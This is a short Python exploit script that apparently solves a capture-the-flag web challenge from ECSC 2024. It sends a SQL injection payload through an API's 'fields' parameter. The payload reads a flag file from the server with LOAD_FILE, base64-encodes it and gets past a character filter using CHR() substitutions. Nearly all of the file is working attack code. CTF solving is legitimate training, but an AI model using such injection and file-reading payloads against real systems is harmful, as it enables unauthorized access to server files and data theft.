#!/bin/python3

import logging
import os
import base64
import requests

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://thecybertonpost.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

res = requests.post(f'{URL}/api/post/1', json={"fields":["REPLACE(REPLACE(TO_BASE64(LOAD_FILE(CONCAT('/flag_',CHR(0x75),'w',CHR(0x75),'.txt'))), CAST(CHR(0x75) AS VARCHAR(1)), '@'), CAST(CHR(0x55) AS VARCHAR(1)), '!') as flag -- -"]})

flag = res.json()['flag']
flag = flag.replace('@', 'u')
flag = flag.replace('!', 'U')
flag = base64.b64decode(flag.encode()).decode()

print(flag)